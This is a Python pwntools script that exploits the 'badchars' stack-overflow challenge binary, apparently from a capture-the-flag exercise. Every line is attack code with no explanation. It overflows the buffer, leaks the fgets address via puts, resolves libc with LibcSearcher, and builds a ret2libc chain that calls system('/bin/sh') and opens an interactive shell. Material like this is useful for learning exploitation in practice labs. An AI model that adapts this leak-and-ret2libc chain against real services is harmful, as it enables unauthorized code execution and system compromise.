from pwn import *
from time import sleep
from LibcSearcher import LibcSearcher

offset = 0x20 
fpath = "./badchars"
p = process(fpath)
elf = ELF(fpath)
# context.log_level='debug'



if __name__ == '__main__':
	pr = 0x0000000000400b39
	payload = offset * 'a' + 8 * 'b' + p64(pr) + p64(elf.got["fgets"]) + p64(elf.plt["puts"])  + p64(elf.symbols["pwnme"]) 
	p.sendlineafter("> " , payload)
	sleep(2)
	
	p.recv(8)
	addr_fgets = p.recv()[:6]
	temp = "0x"
	for i in addr_fgets[::-1]:
		temp_2 = hex(ord(i))[2:]
		temp += (2 - len(temp_2) ) * '0' + temp_2 
		
	addr_fgets = int(temp , 16)
	# print hex(addr_fgets)
	libc = LibcSearcher("fgets" , addr_fgets)
	# print hex(libc.dump("fgets"))
	libcbase = addr_fgets - libc.dump("fgets")
	addr_sh =libcbase + 0x18cd57 
	# print hex(addr_sh)

	payload2 =  offset * 'a' + 8 * 'b' + p64(pr) + p64(addr_sh) + p64(elf.plt["system"])
	p.sendline(payload2)

	p.interactive()